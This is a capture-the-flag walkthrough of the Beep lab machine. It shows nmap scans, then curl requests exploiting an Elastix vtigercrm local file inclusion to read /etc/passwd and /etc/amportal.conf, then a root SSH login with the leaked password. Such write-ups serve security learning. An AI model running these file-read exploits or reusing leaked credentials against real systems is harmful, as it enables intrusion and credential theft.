Beep has a **very large list of running services**, which can make it a bit challenging to find the correct entry method. This machine can be overwhelming for some as there are many potential attack vectors. Luckily, there are several methods available for gaining access.

## Walkthrough

### Reconnaissance

We will start by **scanning protocolos** in the target machine, this can be divided in 3 phases:
1. Scan for **open ports**.
2. Scan for **services** in these open ports.
3. Scan for **vulnerabilities** in these services.
<br />

Let's start by scanning for **open ports**:

```bash
sudo nmap -sS 10.10.10.7 -p- -T4 --min-rate 5000 -oN all_tcp_ports.txt --open -n -Pn -vv
sudo nmap -sU 10.10.10.7 -p- -T4 --min-rate 5000 -oN all_udp_ports.txt --open -n -Pn -vv
```
<br />

There were **19 open ports**:
+ **22/tcp**
+ **25/tcp**
+ **80/tcp**
+ **110/tcp**
+ **111/tcp**
+ **111/udp**
+ **123/udp**
+ **143/tcp**
+ **443/tcp**
+ **792/tcp**
+ **993/tcp**
+ **995/tcp**
+ **3306/tcp**
+ **4190/tcp**
+ **4445/tcp**
+ **4559/tcp**
+ **5038/tcp**
+ **10000/tcp**
+ **10000/udp**
<br />

Let's check which **services** are running in these ports:

```bash
sudo nmap -sS 10.10.10.7 -p 22,25,80,110,111,143,443,792,993,995,3306,4190,4445,4559,5038,10000 -T4 --min-rate 5000 -oX open_tcp_ports.xml -oN open_tcp_ports.txt --version-all -n -Pn -A
sudo nmap -sU 10.10.10.7 -p 111,123,10000 -T4 --min-rate 5000 -oX open_tcp_ports.xml -oN open_udp_ports.txt --version-all -n -Pn -A
```
<br />

There are a lot of services that does not provide relevant information, but the ones that do are:
+ **22/tcp OpenSSH 4.3 (protocol 2.0)**
+ **443/tcp Apache httpd 2.2.3 ((CentOS))**
+ **5038/tcp Asterisk Call Manager 1.1**
+ **10000/tcp MiniServ 1.570 (Webmin httpd)**
<br />

Now we will seek for **vulnerabilities**:

```bash
sudo nmap -sS 10.10.10.7 -p 22,25,80,110,111,143,443,792,993,995,3306,4190,4445,4559,5038,10000 -T4 --min-rate 5000 --script="vuln or intrusive or discovery" -oN tcp_vulns.txt -oX tcp_vulns.xml -n -Pn
sudo nmap -sU 10.10.10.7 -p 111,123,10000 -T4 --min-rate 5000 --script="vuln or intrusive or discovery" -oN tcp_vulns.txt -oX tcp_vulns.xml -n -Pn
```
<br />

This scan didn't return any relevant information.<br />

### Foothold

This machine didn't feel like an easy machine for me due to the overwhelming amount of open ports, some problems with SSL and being the first time I meet Elastix and FreePBX.<br />

We will focus on the website located on port 443, however it will give us a **TLS error** due to a very old version of it, to overcome this problem, we have to type about:config in our **Firefox URL bar** and set to **true** this element, if it doesn't exist, create it:

```
security.tls.version.enable-deprecated
```
<br />

Once this is done we can access the website to find an **Elastix login page**:<br />

<br />
<br />

Searching for Elastix on `searchsploit` returns an **LFI vulnerability**:

```bash
searchsploit Elastix
```

<br />
<br />

We can check this vulnerability by running:

```bash
curl -k 'https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../../etc/passwd%00&module=Accounts&action'
```

<br />
<br />

The first I though after seeing this was **log poisoning**, however it didn't work, so I searched for sensitive files and found **Asterisk's configuration file /etc/amportal.conf**, so let's print it and omit comments:

```bash
curl -k 'https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../../etc/amportal.conf%00&module=Accounts&action' | grep -v '^#'
```

<br />
<br />

Great!! We have a **password**, we can try it with the **users we enumerated printing the /etc/passwd file**, it will give us some **algorithms errors**, so I will solve them with a few parameters, luckily for us, it was **root's password**:

```bash
ssh root@10.10.10.7 -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=ssh-rsa
```
